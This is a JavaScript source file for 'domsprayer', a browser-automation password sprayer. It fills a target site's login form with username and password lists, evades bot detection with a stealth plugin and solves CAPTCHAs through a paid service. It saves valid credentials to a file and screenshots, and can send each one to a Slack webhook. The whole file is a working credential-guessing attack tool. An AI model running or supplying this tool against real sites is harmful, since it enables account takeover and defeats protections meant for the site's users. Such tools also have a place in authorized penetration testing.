const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const RecaptchaPlugin = require("puppeteer-extra-plugin-recaptcha");
const commander = require("commander");
const fs = require("fs");
const { IncomingWebhook } = require("@slack/webhook");
const chalk = require("chalk");
const sleep = require("sleep-promise");
const path = require("path");
require("log-timestamp");

commander
    .name("domsprayer")
    .description("A generic DOM-based password sprayer")
    .version("2.0.0")
    .option("-t, --target <url>", "Target URL")
    .option("-uf, --username-field <selector>", "Username field selector")
    .option("-pf, --password-field <selector>", "Password field selector")
    .option("-lf, --login-button <selector>", "Login button selector")
    .option("-u, --usernames <file>", "Path to the usernames file")
    .option("-p, --passwords <file>", "Path to the passwords file")
    .option(
        "-w, --wait-time <ms>",
        "Minimum time to wait for page to load in milliseconds",
        1000,
        parseInt
    )
    .option(
        "-i, --interval <ms>",
        "Interval between login attempts in milliseconds",
        0,
        parseInt
    )
    .option("-H, --headless", "Run in headless mode", false)
    .option("-k, --api-key <key>", "2Captcha API key")
    // set if captcha should be solved before or after clicking the login
    // button
    .option(
        "-c, --captcha-before",
        "Solve captcha before clicking the login button",
        false
    )
    .option(
        "-C, --captcha-after",
        "Solve captcha after clicking the login button",
        false
    )
    // search captcha in child frames
    .option("--captcha-frames", "Search for captcha in child frames", false)
    .option("-s, --slack-webhook <url>", "Slack webhook URL")
    .option(
        "-o, --output <outputFile>",
        "Specify the output file name",
        "valid_creds.txt"
    )
    .option(
        "--test",
        "Test bot detection and take screenshot of the results",
        false
    )
    .option(
        "--demo",
        "Run in demo mode (do not output passwords to the screen)",
        false
    )
    .option(
        "--typing-delay <ms>",
        "Delay for typing in milliseconds",
        100,
        parseInt
    )
    .option(
        "-S, --screenshot",
        "Take screenshot on successful login or on unexpected behaviour",
        false
    )
    .option(
        "-d, --directory <dir>",
        "Directory to save screenshots when using -S",
        "screenshots"
    )
    .parse();

const options = commander.opts();

// Validate options
if (!options.test && (!options.usernames || !options.passwords)) {
    console.error(chalk.red("Usernames file and passwords file are required!"));
    process.exit(1);
}
// Remove trailing slashes from path
options.directory = path.normalize(options.directory);

// Check if directory exists and create it if it doesn't
if (!fs.existsSync(options.directory)) {
    fs.mkdirSync(options.directory);
    console.log(
        chalk.cyan("Directory", chalk.underline(options.directory), "created.")
    );
}

// If API key is provided but none of the captcha options are set, set
// captcha-before to true
if (options.apiKey && !options.captchaBefore && !options.captchaAfter) {
    options.captchaBefore = true;
}

// If captcha options are set, but no API key is provided, throw an error
if (
    (options.captchaBefore || options.captchaAfter) &&
    !options.apiKey &&
    !options.test
) {
    console.error(
        chalk.red("Captcha options are set, but no API key is provided!")
    );
    process.exit(1);
}

async function waitForDelayAndSelector(page, delay, selector) {
    if (delay) {
        await page.waitForTimeout(delay);
    }
    return await page.waitForSelector(selector);
}

async function removeFromArray(arr, element) {
    const index = arr.indexOf(element);
    if (index !== -1) {
        arr.splice(index, 1);
    }
}

async function sendSlackWebhook(webhookUrl, username, password) {
    try {
        const msg = `Login Success!\nUsername: ${username}\nPassword: ${password}`;
        const payload = {
            text: msg,
        };
        // Initialize with defaults
        const webhook = new IncomingWebhook(webhookUrl, {
            icon_emoji: ":bomb:",
        });
        // Send the notification
        (async () => {
            await webhook.send(payload);
        })();
    } catch (error) {
        console.error(
            chalk.red("Failed to send message to Slack webhook:"),
            error
        );
    }
}

async function checkLoginSuccess(page, options) {
    // Check if the login was successful using the following methods:
    // 1. Check if the URL changed
    // 2. Check if the login form is still present

    const url = page.url();

    if (url !== options.target) {
        return true;
    }
    return false;
}

async function solveCaptcha(page, options) {
    if (options.captchaFrames) {
        //  Loop over all potential frames on that page
        for (const frame of page.mainFrame().childFrames()) {
            // Attempt to solve any potential captchas in those frames
            await frame.solveRecaptchas();
        }
    } else {
        // Attempt to solve any potential captchas in the main frame
        await page.solveRecaptchas();
    }
}

// main code
(async () => {
    // Load the stealth plugin
    puppeteer.use(StealthPlugin());

    if (options.apiKey) {
        // Load the recaptcha plugin
        const recaptchaPlugin = RecaptchaPlugin({
            provider: { id: "2captcha", token: options.apiKey },
            visualFeedback: true,
            throwOnError: true,
        });
        puppeteer.use(recaptchaPlugin);
    }

    if (options.headless) {
        options.headless = "new";
    }
    const browserOptions = {
        args: [
            "--no-sandbox",
            "--disable-features=IsolateOrigins,site-per-process,SitePerProcess",
            "--flag-switches-begin --disable-site-isolation-trials --flag-switches-end",
        ],
        headless: options.headless,
        defaultViewport: null,
    };

    const browser = await puppeteer.launch(browserOptions);

    if (options.test) {
        console.log("Running tests...");
        const page = await browser.newPage();
        await page.setDefaultTimeout(15000);
        await page.goto("https://bot.sannysoft.com");
        await page.waitForTimeout(5000);
        await page.screenshot({ path: "testresult.png", fullPage: true });
        await browser.close();
        console.log(`All done, check the screenshot. ✨`);
        process.exit(0);
    } else {
        try {
            // Read usernames and passwords from files
            const usernames = fs
                .readFileSync(options.usernames, "utf8")
                .split("\n");
            const passwords = fs
                .readFileSync(options.passwords, "utf8")
                .split("\n");

            for (const password of passwords) {
                if (password === null || password === "") {
                    continue;
                }
                if (options.demo) {
                    console.log("[+] Spraying password **************");
                } else {
                    console.log("[+] Spraying password ", password);
                }
                for (const username of usernames) {
                    if (username === null || username === "") {
                        continue;
                    }

                    const page = await browser.newPage();
                    tryuserlabel: try {
                        // Initialize object to control usage of anti-captcha service
                        const statsSvc = {
                            used: false,
                            id: "",
                            text: "",
                            success: false,
                        };

                        console.log(`Current username: ${username}`);

                        await page.goto(options.target);

                        // Wait for the page to load
                        // this will throw if selector is not found
                        const usernameSelector = await waitForDelayAndSelector(
                            page,
                            options.waitTime,
                            options["usernameField"]
                        );

                        // Type into username box
                        await usernameSelector.type(username, {
                            delay: options.typingDelay,
                        });
                        // await page.keyboard.press("Enter");

                        // Search and type into password box

                        const passwordSelector = await waitForDelayAndSelector(
                            page,
                            options.waitTime,
                            options["passwordField"]
                        );

                        await passwordSelector.type(password, {
                            delay: options.typingDelay,
                        });

                        if (options.captchaBefore) {
                            // Solve captcha before clicking the login button
                            await solveCaptcha(page, options);
                        }

                        // Click on login button
                        const loginButtonSelector =
                            await waitForDelayAndSelector(
                                page,
                                options.waitTime,
                                options["loginButton"]
                            );
                        await loginButtonSelector.click();

                        if (options.captchaAfter) {
                            // Solve captcha after clicking the login button
                            await solveCaptcha(page, options);
                        }

                        try {
                            await page.waitForNavigation();
                        } catch {}

                        // Check if login was successful
                        const isLoginSuccessful = await checkLoginSuccess(
                            page,
                            options
                        );
                        if (isLoginSuccessful) {
                            fs.appendFileSync(
                                options.output,
                                `${username}:${password}\n`
                            );

                            await removeFromArray(usernames, username);

                            // Log to stdout
                            if (options.demo) {
                                const msg = `[+] Found valid credentials -> ${username}:**********`;
                                console.log(chalk.green(msg));
                            } else {
                                const msg = `[+] Found valid credentials -> ${username}:${password}`;
                                console.log(chalk.green(msg));
                            }

                            // Take screenshot if option is enabled
                            if (options.screenshot) {
                                const encodedCred = Buffer.from(
                                    `${username}:${password}`
                                ).toString("base64url");
                                const scr_path = path.join(
                                    options.directory,
                                    `success_${encodedCred}.png`
                                );
                                try {
                                    await page.screenshot({
                                        path: scr_path,
                                        fullPage: true,
                                    });
                                    console.log(
                                        chalk.blue(
                                            "Screenshot saved to ",
                                            scr_path
                                        )
                                    );
                                } catch {
                                    console.error(
                                        chalk.red(
                                            "Could not save screenshot to ",
                                            scr_path
                                        )
                                    );
                                }
                            }

                            // Send Slack webhook with username and password
                            if (options.slackWebhook) {
                                // In case of error, it will just log a message
                                await sendSlackWebhook(
                                    options.slackWebhook,
                                    username,
                                    password
                                );
                            }
                        }
                    } catch (error) {
                        fs.appendFileSync(
                            "incomplete_reqs.txt",
                            `${username}:${password}\n`
                        );
                        console.error(chalk.red(`An error occurred: ${error}`));
                    } finally {
                        // clear browsing data
                        const client = await page.target().createCDPSession();
                        await client.send("Network.clearBrowserCookies");
                        await client.send("Network.clearBrowserCache");
                        // always close page
                        await page.close();
                        await sleep(options.interval);
                    }
                }
            }
            // await browser.close();
        } catch (error) {
            console.error(chalk.red(`An error occurred: ${error}`));
        } finally {
            await browser.close();
            process.exit(0);
        }
    }
})();
